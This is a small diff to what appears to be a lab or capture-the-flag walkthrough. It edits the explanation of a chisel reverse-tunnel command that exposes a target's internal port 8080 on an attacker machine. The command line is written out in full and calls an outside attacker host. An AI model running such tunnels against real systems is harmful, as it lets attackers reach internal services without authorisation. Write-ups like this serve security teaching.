@@ -347,9 +347,11 @@ gzip -d chisel_1.11.3_linux_amd64.gz
 chmod +x chisel_1.11.3_linux_amd64.gz
 ./chisel_1.11.3_linux_amd64 client 192.168.0.105:9001 R:8983:127.0.0.1:8080
 ```
-Here "./chisel_1.11.3_linux_amd64 client 192.168.0.105:9001 R:8983:127.0.0.1:8080" , we are forwarding port of 8080 of the machine ip "127.0.0.1" to port of 8983 of remote op "192.168.0.105"
+Here "./chisel_1.11.3_linux_amd64 client 192.168.0.105:9001 R:8983:127.0.0.1:8080" 
+\ 
+We are forwarding the port 8080 of the machine ip "127.0.0.1" to port of 8983 of remote ip "192.168.0.105"
 \
-Opening port 8983 in browser , shows
+Opening port 8983 in browser of attacker machine , shows
 \
 <img width="404" height="222" alt="image" src="https://github.com/user-attachments/assets/c6bc6ab9-f979-4560-9f42-622ec87f39c9" />
 \
